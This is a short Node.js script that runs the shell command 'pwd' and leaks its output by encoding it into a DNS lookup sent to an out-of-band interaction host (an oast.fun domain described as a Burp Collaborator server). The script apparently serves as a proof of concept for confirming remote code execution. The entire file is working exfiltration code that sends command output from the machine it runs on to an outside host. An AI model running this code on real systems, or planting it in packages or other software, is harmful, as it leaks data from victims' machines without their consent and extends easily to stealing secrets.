const { exec } = require('child_process');
const dns = require('dns');

// Replace with your Burp Collaborator server address
const collaboratorServer = 'cgztbp62vtc0000wrwe0gex7f5yyyyyyb.oast.fun';

exec('pwd', (error, stdout, stderr) => {
  if (error) {
    console.error(`exec error: ${error}`);
    return;
  }

  const pwdResult = stdout.trim();

  // Perform DNS lookup to send data to Burp Collaborator
  dns.resolveTxt(`${pwdResult}.${collaboratorServer}`, (err, addresses) => {
    if (err) {
      console.error(`DNS lookup error: ${err}`);
      return;
    }

    console.log(`Sent pwd result to Burp Collaborator: ${pwdResult}`);
  });
});
